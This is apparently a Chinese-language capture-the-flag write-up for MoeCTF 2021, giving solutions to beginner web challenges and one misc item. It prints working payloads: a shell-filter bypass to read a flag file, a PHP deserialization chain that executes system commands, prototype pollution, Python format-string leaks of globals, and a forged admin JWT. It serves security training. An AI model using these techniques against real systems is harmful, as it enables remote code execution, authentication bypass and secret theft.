# MoeCTF 2021

## Web

### Web安全入门指北—小饼干

<figure><img src=".gitbook/assets/Web安全入门指北—小饼干.png" alt="" width="375"><figcaption></figcaption></figure>

改下 Cookie 就可以得到 flag。

### Web安全入门指北—GET

```php
<?php
include "flag.php";
$moe = $_GET['moe'];
if ($moe == "flag") {
    echo $flag;
}else {
    highlight_file(__FILE__);
}
```

Payload 如下

```
moe=flag
```

### 2048

打开网站源代码 - 搜索 flag - 找到 `getFlag` 函数。

```js
getFlag: function() {
	var req = new XMLHttpRequest;
	req.open("GET","flag.php?score="+obj.score,true);
	req.onload = function() {
		alert(this.responseText);
	}
	req.send();
}
```

访问 `/flag.php?score=100000` 即可得到 flag。

### babyRCE

```php
<?php

$rce = $_GET['rce'];
if (isset($rce)) {
    if (!preg_match("/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\>|\<|\'|\"/i", $rce)) {
        system($rce);
    }else {
        echo "hhhhhhacker!!!"."\n";
    }
} else {
    highlight_file(__FILE__);
}
```

构造 Payload 如下

```
rce=ls
```

可以发现该目录下有 `flag.php` 和 `index.php` 两个文件。

构造 Payload 如下

```
rce=c\at${IFS}f\lag.php
```

就可以得到 flag 了。

### unserialize

> https://www.php.cn/faq/485663.html

#### PHP 魔术函数

* \_\_constract：在实例化一个类时，触发
* \_\_destruct：在一个实例对象被销毁的时候触发
* \_\_call(name, arguments)：访问一个不能访问的成员方法时触发
* \_\_get()：读取不可访问属性的值时触发。

#### 解题

**链子**

1. entrance(\_\_construct)
2. entrance(\_\_destruct)
3. springboard(\_\_call)
4. evil(\_\_get)

**构造序列化**

```php
<?php

class entrance
{
    public $start;

    function __construct($start)
    {
        $this->start = $start;
    }

    function __destruct()
    {
        $this->start->helloworld();
    }
}

class springboard
{
    public $middle;

    function __call($name, $arguments)
    {
        echo $this->middle->hs;
    }
}

class evil
{
    public $end;

    function __construct($end)
    {
        $this->end = $end;
    }

    function __get($Attribute)
    {
        eval($this->end);
    }
}

$a = new entrance(new springboard);
$a->start->middle = new evil("system('cat /flag');");
echo serialize($a);
// O:8:"entrance":1:{s:5:"start";O:11:"springboard":1:{s:6:"middle";O:4:"evil":1:{s:3:"end";s:20:"system('cat /flag');";}}}
```

**Payload**

```
serialize=O:8:"entrance":1:{s:5:"start";O:11:"springboard":1:{s:6:"middle";O:4:"evil":1:{s:3:"end";s:20:"system(%27cat%20/flag%27);";}}}
```

### Do you know HTTP

```http
HS / HTTP/1.1
Host: node2.anna.nssctf.cn:28230
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=8767bc72b80045a3c28e8f60acb97340
Connection: close
X-Forwarded-For: 127.0.0.1
Referer: www.ltyyds.com
```

### fake game

查看源代码可以看到 js 代码如下

```js
$(function () {
    $("#submit").on('click', function () {
        $.ajax({
            type: "POST",
            url: "/api/fight",
            contentType: "application/json; charset=utf-8",
            dataType: 'json',
            data: JSON.stringify({
                attributes: {
                    health: parseInt($("#health").val()),
                    attack: parseInt($("#attack").val()),
                    armor: parseInt($("#armor").val()),
                }
            }),
            success: function (res) {
                if (res.status === 200) {
                    alert(res.result);
                } else if(res.status === 403){
                    alert("Invalid input, please try again");
                } else if(res.status === 500){
                    alert("Json data only!");
                }
            },
        })
    })
});
```

本题通过修改 `__proto__` 来修改值就能解力。

通过 `POST` 访问 `/api/fight` ，Payload 如下

```json
{
    "attributes": {
        "health": 0,
        "attack": 0,
        "armor": 0,
        "__proto__": {
            "health": 1000000,
            "attack": 1000000,
            "armor": 1000000
        }
    }
}
```

访问后就可以得到 flag 了。

### 地狱通讯

```python
from flask import Flask, render_template, request
from flag import flag, FLAG
import datetime

app = Flask(__name__)


@app.route("/", methods=['GET', 'POST'])
def index():
    f = open("app.py", "r")
    ctx = f.read()
    f.close()
    f1ag = request.args.get('f1ag') or ""
    exp = request.args.get('exp') or ""
    flAg = FLAG(f1ag)
    message = "Your flag is {0}" + exp
    if exp == "":
        return ctx
    else:
        return message.format(flAg)


if __name__ == "__main__":
    app.run()
```

根据以下 Python 代码

```python
exp = '{0.__class__} {1.__class__}'
message = "{0} {1}" + exp
str1 = 'string'
str2 = 123
print(message)
print(message.format(str1, str2))
# {0} {1}{0.__class__} {1.__class__}
# string 123<class 'str'> <class 'int'>
```

再通过题目中给的 `message.format(flAg)` ，因此该题考的就是 format 格式化字符串。通过构造 Payload 如下

```
exp={0.__class__}
```

得到回显 `Your flag is <class 'flag.FLAG'>` ，说明 FLAG 是个类，再通过 `FLAG(f1ag)` 可以推断出存在构造函数，因此通过构造 Payload 如下

```
exp={0.__class__.__init__.__globals__}
```

就可以读取到 flag 力！

### 地狱通讯-改

拿到题目后先对代码进行格式化（

```python
from flask import Flask, render_template, request, session, redirect, make_response
from secret import secret, headers, User
import datetime
import jwt

app = Flask(__name__)


@app.route("/", methods=['GET', 'POST'])
def index():
    f = open("app.py", "r")
    ctx = f.read()
    f.close()
    res = make_response(ctx)
    name = request.args.get('name') or ''
    if 'admin' in name or name == '':
        return res
    payload = {"name": name, }
    token = jwt.encode(payload, secret, algorithm='HS256', headers=headers)
    res.set_cookie('token', token)
    return res


@app.route('/hello', methods=['GET', 'POST'])
def hello():
    token = request.cookies.get('token')
    if not token:
        return redirect('/', 302)
    try:
        name = jwt.decode(token, secret, algorithms=['HS256'])['name']
    except jwt.exceptions.InvalidSignatureError as e:
        return "Invalid token"
    if name != "admin":
        user = User(name)
        flag = request.args.get('flag') or ''
        message = "Hello {0}, your flag is" + flag
        return message.format(user)
    else:
        return render_template('flag.html', name=name)


if __name__ == "__main__":
    app.run()
```

该题需要得到 `jwt` 为 `admin` 来获取 flag，在生成 `jwt` 的前提是获取 `secret` 和 `headers` ，先随便传入一个 name 来获取 `jwt` ，Payload 如下

```
name=K1sARa
```

可以得到 token 如下

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

在 `/hello` 中可以通过跟上题一样的 Python 格式化字符串来获取 `secret` 和 `headers` 的值，构造的 Payload 如下

```
flag={0.__class__.__init__.__globals__}
```

通过回显可以得到 `secret` 的值为 `u_have_kn0w_what_f0rmat_i5` ， `headers` 的值为 `{'alg': 'HS256', 'typ': 'JWT'}` 。

通过以下代码

```python
import jwt

print(jwt.encode({
    'name': 'admin'
}, 'u_have_kn0w_what_f0rmat_i5', algorithm='HS256', headers= {
    'alg': 'HS256',
    'typ': 'JWT'
}))
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4ifQ.jlAcmWWxtmNLxbxwfRE45Fxf16dX6LQmrK_1dgx7zmg
```

可以得到用户名为 `admin` 的 token，通过这个 token 作为 Cookie 再去访问 `/hello` 就可以得到 flag 力！

## Misc

### misc入门指北

flag 在 markdown 文件末尾 `moectf{Th1s-1s-Misc}` ！指北好耶！
